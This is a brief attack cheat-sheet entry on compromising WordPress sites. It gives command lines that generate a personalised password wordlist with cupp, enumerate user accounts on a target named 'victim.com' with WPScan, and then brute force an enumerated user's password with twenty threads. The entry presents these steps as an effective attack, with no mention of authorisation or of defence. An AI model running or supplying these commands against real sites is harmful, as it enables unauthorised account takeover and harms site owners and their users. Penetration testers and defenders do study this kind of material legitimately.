Wordpress
======
WordPress is a free and open-source CMS based on PHP and MySQL.

Brute Force with WPScan
======
Wordpress can be easily brute forced with WPScan, with an aid of cupp for generating the wordlist the attack is very effective
```
// Generate custom wordlist
./cupp.py

// Users enumeration
wpscan -u victim.com --enumerate u

// Brute force
wpscan -u victim.com --threads 20 --wordlist cupp_wordlist.txt --username enumerated_user
```